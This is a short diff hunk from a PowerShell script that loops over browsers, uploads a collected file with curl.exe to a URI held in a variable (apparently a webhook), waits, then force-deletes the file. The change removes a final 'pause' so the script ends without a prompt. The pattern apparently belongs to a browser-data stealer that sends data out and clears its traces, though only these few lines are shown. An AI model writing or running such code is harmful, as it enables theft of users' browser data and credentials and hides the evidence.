@@ -43,4 +43,3 @@ foreach ($Browser in $Browsers) {
 curl.exe -F file1=@"$outPath" $whuri | Out-Null
 sleep 2
 Remove-Item -Path $outPath -force
-pause
